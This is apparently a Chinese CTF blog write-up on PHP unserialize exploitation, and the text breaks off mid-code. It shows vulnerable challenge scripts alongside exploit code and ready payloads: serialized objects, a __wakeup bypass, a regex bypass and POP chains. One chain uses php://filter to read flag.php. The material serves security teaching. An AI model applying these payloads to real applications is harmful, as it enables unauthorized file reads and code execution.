<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到类wllm中，<code>__destruct()</code>方法被重写，需要修改类成员变量内部值来获取flag，因为<code>__destruct()</code>方法是在对象被销毁是调用，由此我们先创建一个对象，给其成员赋值然后进行序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wllm</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;admin = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$aa</span>-&gt;passwd = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"><span class="variable">$stus</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$stus</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到序列化的结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>将结果传入<code>/?p=O:4:“wllm”:2:&#123;s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:3:“ctf”;&#125;</code></p>
<p>最后得到flag</p>
<hr>
<h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h3><p>只需要令序列化字符串中标识变量数量的值大于实际变量即可绕过__wakeup()函数</p>
<h4 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="攻防世界 Web_php_unserialize"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> <strong>Web_php_unserialize</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>绕过__wakeup()和正则表达式，但是因为这里的private复制的话会丢失\00，所以直接才有代码中替换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line">    <span class="comment">//string(49) &quot;O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;</span></span><br><span class="line">    <span class="variable">$str1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$str</span>);<span class="comment">//绕过preg_match</span></span><br><span class="line">    <span class="variable">$str2</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$str1</span>);<span class="comment">//绕过wakeup</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$str2</span>);</span><br><span class="line">    <span class="comment">//string(49) &quot;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&quot;</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str2</span>));</span><br><span class="line">    <span class="comment">//string(68) &quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>?var = TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</p>
<hr>
<h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h3><p>pop又称之为面向属性编程(Property-Oriented Programing)，常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程(Return-Oriented Programing)的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链</p>
<p>总结来说，就是一个接一个的调用，先找头和尾，然后看看魔术方法谁能互相触发，最后构造</p>
<p>来看个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>先找尾巴，很明显在w44m类中的Getflag()中，再顺着向前推，看看有没有什么可以调用Getflag()</p>
<p>看了一圈发现了w33m类中的<strong>toString()中有个函数调用而且类名和函数名都是变量，那么这个</strong>toString() 就和Getflag()连接起来了，再向前推，触发<strong>toString()的条件是当一个对象被当作字符串处理，一看便看到了w22m中</strong>destruct() </p>
<p>最后得到的pop链是：首—&gt;w22m : : <code>__destruct()</code> —&gt; w33m : : <code>__toString()</code>—&gt;w44m : : Getflag()—&gt;尾(flag)</p>
<p>分析完毕，接下来就是构造exp</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w33m</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w22m</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w44m</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;w00m = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;w22m = <span class="string">&quot;Getflag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)); <span class="comment">//这个url可有可无</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="ISCC2025-犯我大吴疆土"><a href="#ISCC2025-犯我大吴疆土" class="headerlink" title="ISCC2025 犯我大吴疆土"></a>ISCC2025 犯我大吴疆土</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 犯flag.php疆⼟者，盛必击⽽破之！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuDingDao</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$desheng</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;desheng = <span class="keyword">array</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$yishi</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$dingjv</span> = <span class="variable language_">$this</span>-&gt;desheng;</span><br><span class="line">		<span class="variable">$dingjv</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;下次沙场相⻅, 徐某定不留情&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TieSuoLianHuan</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$yicheng</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$pojun</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$pojun</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;yicheng);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jie_Xusheng</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sha</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$jiu</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$secret</span> = <span class="string">&#x27;reward.php&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sha = <span class="variable">$secret</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;jiu-&gt;sha;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;sha))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;你休想偷看吴国机密&quot;</span>;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;sha = <span class="string">&quot;reward.php&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你什么都没看到？那说明……有东西你没看到&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xusheng&#x27;</span>])) &#123;</span><br><span class="line">	@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xusheng&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Jie_Xusheng</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 铸下这铁链，江东天险牢不可破！</span></span><br></pre></td></tr></table></figure>
<p><strong>构造Payload</strong></p>
<ol>
<li>设置 <code>TieSuoLianHuan</code> 的 <code>yicheng</code> 为 <strong>php://filter/convert.base64-</strong></li>
</ol>
<p><strong>encode/resource=flag.php</strong> （需URL编码）</p>
<ol>
<li>将 <code>TieSuoLianHuan</code> 实例赋值给 <code>GuDingDao</code> 的 <code>desheng</code> </li>
<li>将 <code>GuDingDao</code> 实例赋值给 <code>Jie_Xusheng (B)</code> 的 jiu 属性</li>
<li>将 <code>Jie_Xusheng</code> (B) 作为 <code>Jie_Xusheng (A)</code> 的 sha 属性</li>
<li>序列化对象A，确保属性命名和类名正确</li>
</ol>
<h4 id="LitCTF-2025-君の名は-NSSCTF"><a href="#LitCTF-2025-君の名は-NSSCTF" class="headerlink" title="LitCTF 2025]君の名は | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6783">LitCTF 2025]君の名は | NSSCTF</a></h4><p>进去直接能看到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span 